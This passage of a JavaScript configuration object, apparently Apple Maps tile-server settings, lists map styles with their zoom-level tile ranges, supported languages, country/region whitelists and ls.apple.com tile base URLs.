                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 65535,
                  minZ: 16,
                  minX: 0,
                  maxY: 65535,
                  minY: 0,
                  maxZ: 16,
                },
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf?flags=2",
        },
        {
          scale: 0,
          style: 14,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-ssl.ls.apple.com/tile",
          validVersion: [
            { genericTile: [], availableTiles: [], identifier: 1 },
          ],
        },
        {
          scale: 0,
          style: 15,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-ssl.ls.apple.com/tile",
          validVersion: [
            { genericTile: [], availableTiles: [], identifier: 1 },
          ],
        },
        {
          scale: 0,
          style: 16,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-ssl.ls.apple.com/tile",
          validVersion: [
            { genericTile: [], availableTiles: [], identifier: 1 },
          ],
        },
        {
          scale: 0,
          style: 17,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-ssl.ls.apple.com/tile",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
              ],
              identifier: 0,
            },
          ],
        },
        {
          scale: 1,
          style: 17,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 1,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-ssl.ls.apple.com/tile",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 2583,
                  minZ: 13,
                  minX: 408,
                  maxY: 3659,
                  minY: 2760,
                  maxZ: 13,
                },
                {
                  maxX: 4535,
                  minZ: 13,
                  minX: 3848,
                  maxY: 3235,
                  minY: 2332,
                  maxZ: 13,
                },
              ],
              identifier: 32,
            },
          ],
        },
        {
          scale: 0,
          style: 18,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 18,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 20,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [
            { countryCode: "AE", region: "AE" },
            { countryCode: "AE", region: "SA" },
            { countryCode: "IN", region: "" },
            { countryCode: "JP", region: "JP" },
            { countryCode: "KR", region: "KR" },
            { countryCode: "MA", region: "MA" },
            { countryCode: "RU", region: "RU" },
            { countryCode: "SA", region: "AE" },
            { countryCode: "SA", region: "SA" },
            { countryCode: "VN", region: "VN" },
          ],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 20,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [
            { countryCode: "AE", region: "AE" },
            { countryCode: "AE", region: "SA" },
            { countryCode: "IN", region: "" },
            { countryCode: "JP", region: "JP" },
            { countryCode: "KR", region: "KR" },
            { countryCode: "MA", region: "MA" },
            { countryCode: "RU", region: "RU" },
            { countryCode: "SA", region: "AE" },
            { countryCode: "SA", region: "SA" },
            { countryCode: "VN", region: "VN" },
          ],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 22,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 22,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 30,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 262143,
                  minZ: 18,
                  minX: 0,
                  maxY: 262143,
                  minY: 0,
                  maxZ: 18,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 30,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 262143,
                  minZ: 18,
                  minX: 0,
                  maxY: 262143,
                  minY: 0,
                  maxZ: 18,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 1,
          style: 33,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 1,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-ssl.ls.apple.com/tile",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 7 },
              ],
              identifier: 4,
            },
          ],
        },
        {
          scale: 0,
          style: 37,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf?flags=2",
        },
        {
          scale: 0,
          style: 37,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf?flags=2",
        },
        {
          scale: 0,
          style: 42,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-ssl.ls.apple.com/tile",
          validVersion: [
            { genericTile: [], availableTiles: [], identifier: 1 },
          ],
        },
        {
          scale: 0,
          style: 43,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-ssl.ls.apple.com/tile",
          validVersion: [
            { genericTile: [], availableTiles: [], identifier: 1 },
          ],
        },
        {
          scale: 0,
          style: 44,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-ssl.ls.apple.com/tile",
          validVersion: [
            { genericTile: [], availableTiles: [], identifier: 1 },
          ],
        },
        {
          scale: 0,
          style: 47,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 47,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 48,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 11201196,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 48,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 11201196,
            },
          ],
